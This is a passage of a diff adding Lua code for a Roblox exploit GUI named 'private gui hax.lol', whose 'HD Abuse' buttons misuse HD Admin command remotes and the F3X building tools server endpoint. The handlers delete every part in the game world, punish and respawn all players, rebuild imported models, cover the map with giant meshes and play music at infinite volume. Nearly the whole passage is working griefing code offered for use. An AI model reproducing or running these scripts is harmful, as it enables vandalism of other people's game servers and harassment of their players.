+				table.insert(syncLightSurface, {Part = data.new, LightType = "SurfaceLight", Color = light.Color, Range = light.Range, Face = light.Face, Angle = light.Angle, Shadows = light.Shadows})
+			end
+		end
+		if #createLightsSurface > 0 then
+			remote:InvokeServer("CreateLights", createLightsSurface)
+			remote:InvokeServer("SyncLighting", syncLightSurface)
+		end
+	
+		local createTextures = {}
+		local syncTexture = {}
+		local createDecals = {}
+		local syncDecal = {}
+		local createFire = {}
+		local syncFire = {}
+		local createSparkles = {}
+		local syncSparkles = {}
+		local createSmoke = {}
+		local syncSmoke = {}
+	
+		for i,data in pairs(totalparts) do
+			local old = data.old
+			local new = data.new
+			for _, child in ipairs(old:GetChildren()) do
+				if child:IsA("Texture") then
+					table.insert(createTextures, {Part = new, Face = child.Face, TextureType = "Texture"})
+					table.insert(syncTexture, {Part = new, Face = child.Face, TextureType = "Texture", StudsPerTileU = child.StudsPerTileU, StudsPerTileV = child.StudsPerTileV, Texture = child.Texture, Transparency = child.Transparency})
+				elseif child:IsA("Decal") then
+					table.insert(createDecals, {Part = new, Face = child.Face, TextureType = "Decal"})
+					table.insert(syncDecal, {Part = new, Face = child.Face, TextureType = "Decal", Texture = child.Texture, Transparency = child.Transparency})
+				elseif child:IsA("Fire") and child.Enabled then
+					table.insert(createFire, {Part = new, DecorationType = "Fire"})
+					table.insert(syncFire, {Part = new, DecorationType = "Fire", Color = child.Color, SecondaryColor = child.SecondaryColor, Size = child.Size, Heat = child.Heat})
+				elseif child:IsA("Sparkles") and child.Enabled then
+					table.insert(createSparkles, {Part = new, DecorationType = "Sparkles"})
+					table.insert(syncSparkles, {Part = new, DecorationType = "Sparkles", SparkleColor = child.SparkleColor})
+				elseif child:IsA("Smoke") and child.Enabled then
+					table.insert(createSmoke, {Part = new, DecorationType = "Smoke"})
+					table.insert(syncSmoke, {Part = new, DecorationType = "Smoke", Color = child.Color, Size = child.Size, RiseVelocity = child.RiseVelocity, Opacity = child.Opacity})
+				end
+			end
+		end
+	
+		if #createTextures > 0 then
+			remote:InvokeServer("CreateTextures", createTextures)
+			remote:InvokeServer("SyncTexture", syncTexture)
+		end
+		if #createDecals > 0 then
+			remote:InvokeServer("CreateTextures", createDecals)
+			remote:InvokeServer("SyncTexture", syncDecal)
+		end
+		if #createFire > 0 then
+			remote:InvokeServer("CreateDecorations", createFire)
+			remote:InvokeServer("SyncDecorate", syncFire)
+		end
+		if #createSparkles > 0 then
+			remote:InvokeServer("CreateDecorations", createSparkles)
+			remote:InvokeServer("SyncDecorate", syncSparkles)
+		end
+		if #createSmoke > 0 then
+			remote:InvokeServer("CreateDecorations", createSmoke)
+			remote:InvokeServer("SyncDecorate", syncSmoke)
+		end
+	
+		imported_model.Parent = nil
+	
+		RequestCommand:InvokeServer(";res all")
+	end)
+end;
+task.spawn(C_2a5);
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button.Button.LocalScript
+function C_2a7()
+local script = G2L["2a7"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- fixed by 1sw0rd1
+		-- credit to 1sword1
+		-- (edited script anti crash by Elv4r0x)
+	
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local character = player.Character 
+		local char = player.Character
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";punish all")
+	
+		local backpack = player.Backpack
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			return nil
+		end
+	
+		local f3x = getf3x()
+		if not f3x then
+			warn("you dont have f3x skid")
+			return
+		end
+	
+		local syncapi = f3x.SyncAPI
+		local serverendpoint = syncapi.ServerEndpoint
+	
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					serverendpoint:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local function delete(part)
+			ohno({"Remove", {part}})
+		end
+	
+		local function deleteall()
+			for _, v in ipairs(workspace:GetDescendants()) do
+				if (v:IsA("BasePart") or v:IsA("UnionOperation")) and v.Name ~= "kys" then
+					task.defer(function()
+						pcall(function()
+							delete(v)
+						end)
+					end)
+				end
+			end
+		end
+	
+		deleteall()
+	
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
+				tool = v.Parent
+			end
+		end
+		if tool == nil then
+			for i,v in player:GetDescendants() do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+				end
+			end
+		end
+		remote = tool.SyncAPI.ServerEndpoint
+	
+		local model_id = "118105570407076"
+		local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
+		imported_model.Parent = game.Lighting
+	
+		local destination = workspace:FindFirstChildOfClass("Terrain")
+		if tool ~= nil and tool:FindFirstChild("Tools") and tool:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
+			destination = workspace
+		end
+	
+		for _, v in next, imported_model:GetDescendants() do
+			pcall(function() v.Anchored = true end)
+		end
+	
+		local totalparts = {}
+		local total = 0
+		local completed = 0
+	
+		for i,v in pairs(imported_model:GetDescendants()) do
+			if v:IsA("Part") or v:IsA("WedgePart") or v:IsA("Seat") or v:IsA("VehicleSeat") or v:IsA("TrussPart") or v:IsA("SpawnLocation") or v:IsA("CornerWedgePart") then
+				total += 1
+				local Type = v:IsA("WedgePart") and "Wedge" or v:IsA("Seat") and "Seat" or v:IsA("VehicleSeat") and "Vehicle Seat" or v:IsA("TrussPart") and "Truss" or v:IsA("SpawnLocation") and "Spawn" or v:IsA("CornerWedgePart") and "Corner" or
+					v.Shape == Enum.PartType.Block and "Normal" or
+					v.Shape == Enum.PartType.Ball and "Ball" or
+					v.Shape == Enum.PartType.Cylinder and "Cylinder"
+				task.defer(function()
+					local part = remote:InvokeServer("CreatePart", Type, v.CFrame, destination)
+					table.insert(totalparts, {new = part, old = v})
+					completed += 1
+				end)
+			end
+		end
+	
+		while completed < total do
+			task.wait()
+		end
+	
+		local syncResize = {}
+		for i,data in pairs(totalparts) do
+			table.insert(syncResize, {Part = data.new, CFrame = data.old.CFrame, Size = data.old.Size})
+		end
+		remote:InvokeServer("SyncResize", syncResize)
+	
+		local syncCollision = {}
+		for i,data in pairs(totalparts) do
+			if data.old.CanCollide ~= true then
+				table.insert(syncCollision, {Part = data.new, CanCollide = data.old.CanCollide})
+			end
+		end
+		if #syncCollision > 0 then
+			remote:InvokeServer("SyncCollision", syncCollision)
+		end
+	
+		local syncColor = {}
+		for i,data in pairs(totalparts) do
+			table.insert(syncColor, {Part = data.new, Color = data.old.Color})
+		end
+		remote:InvokeServer("SyncColor", syncColor)
+	
+		local syncMaterial = {}
+		for i,data in pairs(totalparts) do
+			if data.old.Material ~= "Plastic" or data.old.Reflectance ~= 0 or data.old.Transparency ~= 0 then
+				table.insert(syncMaterial, {Part = data.new, Material = data.old.Material, Transparency = data.old.Transparency, Reflectance = data.old.Reflectance})
+			end
+		end
+		if #syncMaterial > 0 then
+			remote:InvokeServer("SyncMaterial", syncMaterial)
+		end
+	
+		local syncSurface = {}
+		for i,data in pairs(totalparts) do
+			table.insert(syncSurface, {Part = data.new, Surfaces = {Top = data.old.TopSurface, Front = data.old.FrontSurface, Bottom = data.old.BottomSurface, Right = data.old.RightSurface, Left = data.old.LeftSurface, Back = data.old.BackSurface}})
+		end
+		remote:InvokeServer("SyncSurface", syncSurface)
+	
+		local createMeshes = {}
+		local syncMesh = {}
+		for i,data in pairs(totalparts) do
+			local mesh = data.old:FindFirstChildOfClass("SpecialMesh")
+			if mesh then
+				table.insert(createMeshes, {Part = data.new})
+				table.insert(syncMesh, {Part = data.new, MeshId = mesh.MeshId, TextureId = mesh.TextureId, Scale = mesh.Scale, MeshType = mesh.MeshType, VertexColor = mesh.VertexColor})
+			end
+		end
+		if #createMeshes > 0 then
+			remote:InvokeServer("CreateMeshes", createMeshes)
+			remote:InvokeServer("SyncMesh", syncMesh)
+		end
+	
+		local createMeshesCyl = {}
+		for i,data in pairs(totalparts) do
+			local mesh = data.old:FindFirstChildOfClass("CylinderMesh")
+			if mesh then
+				table.insert(createMeshesCyl, {Part = data.new})
+			end
+		end
+		if #createMeshesCyl > 0 then
+			remote:InvokeServer("CreateMeshes", createMeshesCyl)
+		end
+	
+		local createLightsSpot = {}
+		local syncLightSpot = {}
+		for i,data in pairs(totalparts) do
+			local light = data.old:FindFirstChildOfClass("SpotLight")
+			if light then
+				table.insert(createLightsSpot, {Part = data.new, LightType = "SpotLight"})
+				table.insert(syncLightSpot, {Part = data.new, LightType = "SpotLight", Color = light.Color, Range = light.Range, Face = light.Face, Angle = light.Angle, Shadows = light.Shadows})
+			end
+		end
+		if #createLightsSpot > 0 then
+			remote:InvokeServer("CreateLights", createLightsSpot)
+			remote:InvokeServer("SyncLighting", syncLightSpot)
+		end
+	
+		local createLightsPoint = {}
+		local syncLightPoint = {}
+		for i,data in pairs(totalparts) do
+			local light = data.old:FindFirstChildOfClass("PointLight")
+			if light then
+				table.insert(createLightsPoint, {Part = data.new, LightType = "PointLight"})
+				table.insert(syncLightPoint, {Part = data.new, LightType = "PointLight", Color = light.Color, Range = light.Range, Shadows = light.Shadows})
+			end
+		end
+		if #createLightsPoint > 0 then
+			remote:InvokeServer("CreateLights", createLightsPoint)
+			remote:InvokeServer("SyncLighting", syncLightPoint)
+		end
+	
+		local createLightsSurface = {}
+		local syncLightSurface = {}
+		for i,data in pairs(totalparts) do
+			local light = data.old:FindFirstChildOfClass("SurfaceLight")
+			if light then
+				table.insert(createLightsSurface, {Part = data.new, LightType = "SurfaceLight"})
+				table.insert(syncLightSurface, {Part = data.new, LightType = "SurfaceLight", Color = light.Color, Range = light.Range, Face = light.Face, Angle = light.Angle, Shadows = light.Shadows})
+			end
+		end
+		if #createLightsSurface > 0 then
+			remote:InvokeServer("CreateLights", createLightsSurface)
+			remote:InvokeServer("SyncLighting", syncLightSurface)
+		end
+	
+		local createTextures = {}
+		local syncTexture = {}
+		local createDecals = {}
+		local syncDecal = {}
+		local createFire = {}
+		local syncFire = {}
+		local createSparkles = {}
+		local syncSparkles = {}
+		local createSmoke = {}
+		local syncSmoke = {}
+	
+		for i,data in pairs(totalparts) do
+			local old = data.old
+			local new = data.new
+			for _, child in ipairs(old:GetChildren()) do
+				if child:IsA("Texture") then
+					table.insert(createTextures, {Part = new, Face = child.Face, TextureType = "Texture"})
+					table.insert(syncTexture, {Part = new, Face = child.Face, TextureType = "Texture", StudsPerTileU = child.StudsPerTileU, StudsPerTileV = child.StudsPerTileV, Texture = child.Texture, Transparency = child.Transparency})
+				elseif child:IsA("Decal") then
+					table.insert(createDecals, {Part = new, Face = child.Face, TextureType = "Decal"})
+					table.insert(syncDecal, {Part = new, Face = child.Face, TextureType = "Decal", Texture = child.Texture, Transparency = child.Transparency})
+				elseif child:IsA("Fire") and child.Enabled then
+					table.insert(createFire, {Part = new, DecorationType = "Fire"})
+					table.insert(syncFire, {Part = new, DecorationType = "Fire", Color = child.Color, SecondaryColor = child.SecondaryColor, Size = child.Size, Heat = child.Heat})
+				elseif child:IsA("Sparkles") and child.Enabled then
+					table.insert(createSparkles, {Part = new, DecorationType = "Sparkles"})
+					table.insert(syncSparkles, {Part = new, DecorationType = "Sparkles", SparkleColor = child.SparkleColor})
+				elseif child:IsA("Smoke") and child.Enabled then
+					table.insert(createSmoke, {Part = new, DecorationType = "Smoke"})
+					table.insert(syncSmoke, {Part = new, DecorationType = "Smoke", Color = child.Color, Size = child.Size, RiseVelocity = child.RiseVelocity, Opacity = child.Opacity})
+				end
+			end
+		end
+	
+		if #createTextures > 0 then
+			remote:InvokeServer("CreateTextures", createTextures)
+			remote:InvokeServer("SyncTexture", syncTexture)
+		end
+		if #createDecals > 0 then
+			remote:InvokeServer("CreateTextures", createDecals)
+			remote:InvokeServer("SyncTexture", syncDecal)
+		end
+		if #createFire > 0 then
+			remote:InvokeServer("CreateDecorations", createFire)
+			remote:InvokeServer("SyncDecorate", syncFire)
+		end
+		if #createSparkles > 0 then
+			remote:InvokeServer("CreateDecorations", createSparkles)
+			remote:InvokeServer("SyncDecorate", syncSparkles)
+		end
+		if #createSmoke > 0 then
+			remote:InvokeServer("CreateDecorations", createSmoke)
+			remote:InvokeServer("SyncDecorate", syncSmoke)
+		end
+		
+		task.wait(0.01)
+		
+		local id = "129437562095463"
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";time 0 ;fogcolor black ;unfog")
+	
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local player = Players.LocalPlayer
+	
+		local function findTool()
+			local char = player.Character or player.CharacterAdded:Wait()
+			for _, v in ipairs(char:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(player.Backpack:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+		end
+	
+		local tool = findTool()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					remote:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local hack = Workspace:FindFirstChild("kys")
+		if hack then
+			ohno({"Remove", { hack }})
+		end
+	
+		local char = player.Character or player.CharacterAdded:Wait()
+		local hrp = char:WaitForChild("HumanoidRootPart")
+		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
+	
+		local sky = remote:InvokeServer("CreatePart", "Normal", cf, Workspace)
+	
+		ohno({"SyncAnchor", { { Part = sky, Anchored = true } }})
+		ohno({"SyncCollision", { { Part = sky, CanCollide = false } }})
+		ohno({"CreateMeshes", { { Part = sky } }})
+		ohno({"SyncMesh", { {
+			Part = sky,
+			MeshId = "rbxassetid://111891702759441",
+			TextureId = "rbxassetid://" .. id,
+			Scale = Vector3.new(100999, 100999, 100999),
+			VertexColor = Vector3.new(4, 4, 4)
+		} }})
+		ohno({"SetLocked", { sky }, true})
+		ohno({"SetName", { sky }, "kys"})
+		ohno({"SyncMaterial", { { Part = sky, Transparency = tonumber(trans) } }})
+		ohno({"SyncMove", { { Part = sky, CFrame = cf } }})
+	
+		imported_model.Parent = nil
+	
+		RequestCommand:InvokeServer(";res all")
+		RequestCommand:InvokeServer(";music 100792696468630")
+		RequestCommand:InvokeServer(";pitch 0.141")
+		RequestCommand:InvokeServer(";volume inf")
+	end)
+end;
+task.spawn(C_2a7);
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button.Button.LocalScript
+function C_2a9()
+local script = G2L["2a9"];
+	script.Parent.MouseButton1Click:Connect(function()
+	
+	
+	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";btools")
+	
+	
+	
+		--[[
+		WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+	]]
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local rq = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local backpack = player.Backpack
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			return nil
+		end
+	
+		local f3x = getf3x()
+		if not f3x then
+			warn("you dont have f3x skid")
+		end
+		local syncapi = f3x.SyncAPI
+		local serverendpoint = syncapi.ServerEndpoint
+	
+		local function _(args)
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function createtexture(part, side)
+			local args = {
+				"CreateTextures",
+				{
+					{
+						Part = part,
+						Face = side,
+						TextureType = "Texture"
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function mate(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Material"] = int
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function floor(part, face)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = face,
+						["TextureType"] = "Texture",
+						["Texture"] = "rbxassetid://83901588886686",
+						["StudsPerTileV"] = 2,
+						["StudsPerTileU"] = 2
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		local function unanchorall()
+			for _, v in ipairs(workspace:GetDescendants()) do
+				if v:IsA("BasePart") or v:IsA("UnionOperation") then
+					spawn(function()
+						DestroyPart(v)
+					end)
+				end
+			end
+		end
+	
+		local function realm()
+			rq:InvokeServer(";punish all")
+			unanchorall()
+	
+			task.wait(1)
+			local model_id = "136210034002788"
+			local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
+			imported_model.Parent = game.Lighting
+	
+	
+			for _, v in next, imported_model:GetDescendants() do
+				pcall(function()
+					v.Anchored = true
+				end)
+			end
+	
+			local plr = game:GetService("Players").LocalPlayer
+			local f3x_name = "Building Tools"
+			local destination = workspace
+	
+			coroutine.wrap(function()
+				task.wait(10)
+				imported_model.Parent = nil
+			end)()
+	
+			function f3xbuildpart(part, cframe, destination, size, transparency, colour, material, collision, fake_part)
+				local allPartsData = {}
+	
+	
+				table.insert(allPartsData, {
+					Type = fake_part:IsA("WedgePart") and "Wedge" or fake_part:IsA("Seat") and "Seat" or fake_part:IsA("VehicleSeat") and "VehicleSeat" or fake_part:IsA("TrussPart") and "Truss" or fake_part:IsA("SpawnLocation") and "Spawn" or
+						fake_part.Shape == Enum.PartType.Block and "Normal" or
+						fake_part.Shape == Enum.PartType.Ball and "Ball" or
+						fake_part.Shape == Enum.PartType.Cylinder and "Cylinder",
+					CFrame = fake_part.CFrame,
+					Size = fake_part.Size,
+					Transparency = fake_part.Transparency,
+					Color = fake_part.Color,
+					Material = fake_part.Material,
+					Collision = fake_part.CanCollide,
+					Ref = fake_part,
+				})
+	
+				local sync = plr.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint
+				local partMap = {}
+	
+	
+				for _, data in ipairs(allPartsData) do
+					local created = sync:InvokeServer("CreatePart", data.Type, data.CFrame, destination)
+					partMap[data.Ref] = created
+				end
+	
+				for _, data in ipairs(allPartsData) do
+					local created = partMap[data.Ref]
+					if not created then continue end
+	
+					spawn(function()
+						if data.Size ~= Vector3.new(4,1,2) then
+							sync:InvokeServer("SyncResize", {
+								{ Part = created, CFrame = created.CFrame, Size = data.Size }
+							})
+						end
+	
+						if data.Transparency ~= 0 then
+							sync:InvokeServer("SyncMaterial", {
+								{ Part = created, Transparency = data.Transparency }
+							})
+						end
+	
+						if data.Color ~= BrickColor.new("Medium stone grey").Color then
+							sync:InvokeServer("SyncColor", {
+								{ Part = created, Color = data.Color, UnionColoring = true }
+							})
+						end
+	
+						if data.Material ~= "Plastic" then
+							sync:InvokeServer("SyncMaterial", {
+								{ Part = created, Material = data.Material }
+							})
+						end
+	
+						if data.Collision ~= true then
+							sync:InvokeServer("SyncCollision", {
+								{ Part = created, CanCollide = data.Collision }
+							})
+						end
+	
+						local ref = data.Ref
+	
+						local texture = ref:FindFirstChildOfClass("Texture")
+						if texture then
+							sync:InvokeServer("CreateTextures", {
+								{ Part = created, Face = texture.Face, TextureType = "Texture" }
+							})
+							sync:InvokeServer("SyncTexture", {
+								{ Part = created, Face = texture.Face, TextureType = "Texture", StudsPerTileU = texture.StudsPerTileU, StudsPerTileV = texture.StudsPerTileV, Texture = texture.Texture, Transparency = texture.Transparency }
+							})
+						end
+	
+						local decal = ref:FindFirstChildOfClass("Decal")
+						if decal then
+							sync:InvokeServer("CreateTextures", {
+								{ Part = created, Face = decal.Face, TextureType = "Decal" }
+							})
+							sync:InvokeServer("SyncTexture", {
+								{ Part = created, Face = decal.Face, TextureType = "Decal", Texture = decal.Texture, Transparency = decal.Transparency }
+							})
+						end
+	
+						local mesh = ref:FindFirstChildOfClass("SpecialMesh")
+						if mesh then
+							sync:InvokeServer("CreateMeshes", {
+								{ Part = created }
+							})
+							sync:InvokeServer("SyncMesh", {
+								{ Part = created, MeshId = mesh.MeshId, TextureId = mesh.TextureId, Scale = mesh.Scale }
+							})
+						end
+	
+						local light1 = ref:FindFirstChildOfClass("SpotLight")
+						if light1 then
+							sync:InvokeServer("CreateLights", {
+								{ Part = created, LightType = "SpotLight" }
+							})
+							sync:InvokeServer("SyncLighting", {
+								{ Part = created, LightType = "SpotLight", Color = light1.Color, Range = light1.Range, Face = light1.Face, Angle = light1.Angle, Shadows = light1.Shadows }
+							})
+						end
+	
+						local light2 = ref:FindFirstChildOfClass("PointLight")
+						if light2 then
+							sync:InvokeServer("CreateLights", {
+								{ Part = created, LightType = "PointLight" }
+							})
+							sync:InvokeServer("SyncLighting", {
+								{ Part = created, LightType = "PointLight", Color = light2.Color, Range = light2.Range, Shadows = light2.Shadows }
+							})
+	
+						end
+					end)
+				end
+			end
+	
+			for _, part in next, imported_model:GetDescendants() do
+				local function spawnpart(fn)
+					task.spawn(fn)
+				end
+				if part:IsA("Part") then
+					if part.Shape == Enum.PartType.Block then
+						spawnpart(function()
+							f3xbuildpart("Normal", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+						end)
+					elseif part.Shape == Enum.PartType.Ball then
+						spawnpart(function()
+							f3xbuildpart("Ball", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+						end)
+					elseif part.Shape == Enum.PartType.Cylinder then
+						spawnpart(function()
+							f3xbuildpart("Cylinder", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+						end)
+					end
+				elseif part:IsA("WedgePart") then
+					spawnpart(function()
+						f3xbuildpart("Wedge", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+					end)
+				elseif part:IsA("Seat") then
+					spawnpart(function()
+						f3xbuildpart("Seat", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+					end)
+				elseif part:IsA("TrussPart") then
+					spawnpart(function()
+						f3xbuildpart("Truss", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+					end)
+				elseif part:IsA("VehicleSeat") then
+					spawnpart(function()
+						f3xbuildpart("VehicleSeat", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+					end)
+				elseif part:IsA("SpawnLocation") then
+					spawnpart(function()
+						f3xbuildpart("Spawn", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+					end)
+				end
+			end
+	
+			print("Finished build.")
+	
+			task.wait(0.3)
+	
+	
+	
+	
+		end
+	
+		realm()
+	
+		wait(0.2)
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		RequestCommand:InvokeServer(";respawn all")
+		RequestCommand:InvokeServer(";btools me")
+		RequestCommand:InvokeServer(";time 010")
+		RequestCommand:InvokeServer(";music 1839246711")
+	
+	
+		local function findBuildingTools()
+			local player = game:GetService("Players").LocalPlayer
+	
+			for _, item in ipairs(player.Character:GetChildren()) do
+				if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
+					return item
+				end
+			end
+	
+			for _, item in ipairs(player.Backpack:GetChildren()) do
+				if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
+					return item
+				end
+			end
+	
+			return nil
+		end
+	
+		local buildingTools = findBuildingTools()
+		if not buildingTools then
+			warn("btools not found")
+			return
+		end
+	
+		local syncAPI        = buildingTools:FindFirstChild("SyncAPI")
+		local serverEndpoint = syncAPI and syncAPI:FindFirstChild("ServerEndpoint")
+	
+		if not serverEndpoint then
+			warn("btools not found")
+			return
+		end
+	
+		local skyInstance = workspace:FindFirstChild("cZerSky")
+		if not skyInstance then
+			print"ok"
+		end
+	
+		local args = {
+			"Remove",                
+			{ skyInstance }           
+		}
+	
+		local success, result
+		if serverEndpoint:IsA("RemoteFunction") then
+			success, result = pcall(function()
+				return serverEndpoint:InvokeServer(unpack(args))
+			end)
+		else
+	
+			serverEndpoint:FireServer(unpack(args))
+			success = true
+		end
+	
+		if success then
+	
+			print"yay"
+	
+		end
+	
+	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";time 0 !fogcolor black")
+	
+		local player = game.Players.LocalPlayer
+		local char = player.Character or player.CharacterAdded:Wait()
+		local hrp = char:WaitForChild("HumanoidRootPart")
+	
+		local tool
+		for _,v in player:GetDescendants() do
+			if v.Name=="SyncAPI" then
+				tool=v.Parent
+				break
+			end
+		end
+		if not tool then
+			for _,v in game.ReplicatedStorage:GetDescendants() do
+				if v.Name=="SyncAPI" then
+					tool=v.Parent
+					break
+				end
+			end
+		end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+		local function _(a) return remote:InvokeServer(unpack(a)) end
+	
+		local pos = hrp.Position + Vector3.new(0,2,0)
+		local cf = CFrame.new(pos)
+		local sky = remote:InvokeServer("CreatePart","Normal",cf,workspace)
+	
+		task.spawn(function() _( {"SyncAnchor",{{Part=sky,Anchored=true}}} ) end)
+		task.spawn(function() _( {"SyncMove",{{Part=sky,CFrame=cf}}} ) end)
+		task.spawn(function() _( {"CreateMeshes",{{Part=sky}}} ) end)
+		task.spawn(function() _( {"SyncMesh",{{Part=sky,
+			MeshId="rbxassetid://111891702759441",
+			TextureId="rbxassetid://9820931824",
+			Scale=Vector3.new(7777,7777,7777),
+			VertexColor=Vector3.new(3.2,3.2,3.2)}}} ) end)
+		task.spawn(function() _( {"SyncCollision",{{Part=sky,CanCollide=false}}} ) end)
+		task.spawn(function() _( {"SetLocked",{sky},true} ) end)
+		task.spawn(function() _( {"SetName",{sky},"cZerSky"} ) end)
+		task.spawn(function() _( {"SyncMaterial",{{Part=sky,Transparency=0}}} ) end)
+	end)
+end;
+task.spawn(C_2a9);
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button.Button.LocalScript
+function C_2ab()
+local script = G2L["2ab"];
+	script.Parent.MouseButton1Click:Connect(function()
+	
+	
+	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";btools")
+	
+	
+	
+		--[[
+		WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+	]]
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local rq = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local backpack = player.Backpack
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			return nil
+		end
+	
+		local f3x = getf3x()
+		if not f3x then
+			warn("you dont have f3x skid")
+		end
+		local syncapi = f3x.SyncAPI
+		local serverendpoint = syncapi.ServerEndpoint
+	
+		local function _(args)
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function createtexture(part, side)
+			local args = {
+				"CreateTextures",
+				{
+					{
+						Part = part,
+						Face = side,
+						TextureType = "Texture"
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function mate(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Material"] = int
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function floor(part, face)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = face,
+						["TextureType"] = "Texture",
+						["Texture"] = "rbxassetid://83901588886686",
+						["StudsPerTileV"] = 2,
+						["StudsPerTileU"] = 2
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		local function unanchorall()
+			for _, v in ipairs(workspace:GetDescendants()) do
+				if v:IsA("BasePart") or v:IsA("UnionOperation") then
+					spawn(function()
+						DestroyPart(v)
+					end)
+				end
+			end
+		end
+	
+		local function realm()
+			rq:InvokeServer(";punish all")
+			unanchorall()
+	
